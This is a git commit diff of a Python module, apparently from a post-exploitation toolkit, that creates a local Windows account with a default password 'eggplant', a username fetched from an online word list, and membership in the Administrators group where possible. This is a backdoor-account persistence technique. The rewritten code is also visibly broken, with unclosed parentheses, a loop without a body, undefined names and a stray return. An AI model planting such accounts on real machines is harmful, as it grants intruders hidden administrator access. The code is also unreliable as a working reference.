b292a7684f7dd97f19280966f4b35ec85fe11c0f
colental <30509968+colental@users.noreply.github.com>
2017-11-15 02:35:31 -0800

    Update windows_add_user.py

--- modules/windows_add_user.py
+++ modules/windows_add_user.py
@@ -1,43 +1,47 @@
-﻿#!/usr/bin/env python
-# -*- encoding: utf-8 -*-
+from os import getenv
+try:
+	from win32net import NetLocalGroupAddMembers, NetLocalGroupAdd, NetLocalGroupDel, NetUserAdd
+	from win32netcon import UF_SCRIPT, USER_PRIV_ADMIN, USER_PRIV_USER, USER_PRIV_PARMNUM, USER_PRIV_INFOLEVEL, USER_PRIV_MASK, USER_PRIV_GUEST
+except ImportError:
+    if 'configure' in globals():
+	try:
+	    globals()['configure']()
+	except: pass
+
 
 def run(*args, **kwargs):
-    if 'win32net' not in globals():
-        import win32net
+    USER  = choice(get('https://raw.githubusercontent.com/hathcox/Madlibs/master/nouns.list').text.encode().splitlines()).title()
+    PASWD = kwargs.get('password' if 'password' in kwargs else 'eggplant'
+    for GROUP in [USER_PRIV_ADMIN, USER_PRIV_USER, USER_PRIV_PARMNUM, USER_PRIV_INFOLEVEL, USER_PRIV_MASK, USER_PRIV_GUEST]
+    user_info = {
+	    	'name': USER,
+	    	'password': PASWD,
+	    	'priv': GROUP,
+	    	'home_dir': getenv('HOME'),
+	     	'comment': None,
+	     	'flags': UF_SCRIPT,
+		'script_path': None
+    		}
 
-    if 'win32netcon' not in globals():
-        import win32netcon
-
-    if 'os' not in globals():
-        import os
-
-    USER = "guest_account" if 'user' not in kwargs else kwargs.get('user')
-    GROUP = "GuestAdministrators"
-    PASWD = 'eggplant' if 'password' not in kwargs else kwargs.get('password')
-
-    user_info = dict({
-      'name': USER,
-      'password': PASWD,
-      'priv': win32netcon.USER_PRIV_USER,
-      'home_dir': os.getenv('HOME'),
-      'comment': None,
-      'flags': win32netcon.UF_SCRIPT,
-      'script_path': None
-    })
-
-    win32net.NetUserAdd(None, 1, user_info)
+    NetUserAdd(None, 1, user_info)
     group_info = dict({ 'name': GROUP })
 
     try:
-      win32net.NetLocalGroupDel(None, GROUP)
+     NetLocalGroupDel(None, GROUP)
     except win32net.error,(number, context, message):
       if number <> 2220:
         raise
 
-    win32net.NetLocalGroupAdd(None, 0, group_info)
+    NetLocalGroupAdd(None, 0, group_info)
     user_group_info = dict({ 'domainandname': USER })
-    win32net.NetLocalGroupAddMembers(None, GROUP, 3, [user_group_info])
+    NetLocalGroupAddMembers(None, GROUP, 3, [user_group_info])
 
 
 if __name__ == '__main__':
-    run(user='guest_account', password='eggplant')
+    try:
+        run(group='Administrators')
+    except:
+	try:
+	    run(group='Users')
+	except:
+	    return
